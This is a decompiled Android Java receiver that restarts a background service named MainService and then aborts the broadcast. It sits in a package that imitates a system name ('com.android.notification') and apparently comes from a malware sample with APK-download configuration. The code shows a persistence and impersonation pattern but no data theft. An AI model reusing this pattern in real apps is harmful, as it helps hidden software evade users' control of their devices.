package com.android.notification;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.notification.configure.DownApkXmlKey;
import com.android.notification.configure.IntentFlag;
import com.android.notification.util.AppUtil;
import com.android.notification.util.Tool;

public class ReStartRecevier extends BroadcastReceiver {
    private final String nService = "com.android.notification.MainService";
    private final String serviceAction = "android.alarm.notification.RESTART_SERVICE";

    public void onReceive(Context context, Intent intent) {
        if ("android.alarm.notification.RESTART_SERVICE".equals(intent.getAction())) {
            Tool.JWDlog(DownApkXmlKey.ROOT, "class:ReStartRecevier  func:onReceive  text:sdcard wait");
            boolean IfServiceOn = AppUtil.MyServiceOrNotStart(((ActivityManager) context.getSystemService("activity")).getRunningServices(1000), "com.android.notification.MainService");
            Intent intentService = new Intent();
            intentService.setAction("com.android.notification.MainService");
            if (IfServiceOn) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:ReStartRecevier  func:onReceive  text:stop service");
                context.stopService(intentService);
            }
            if (AppUtil.hasSdcard()) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:ReStartRecevier  func:onReceive  text:restart service");
                try {
                    AppUtil.CheckRecordFile();
                    intentService.putExtra(IntentFlag.FLAG, IntentFlag.RESTART);
                    context.startService(intentService);
                } catch (Exception e) {
                    e.printStackTrace();
                    intentService.putExtra(IntentFlag.FLAG, IntentFlag.RESTART);
                    context.startService(intentService);
                }
            }
            abortBroadcast();
        }
    }
}
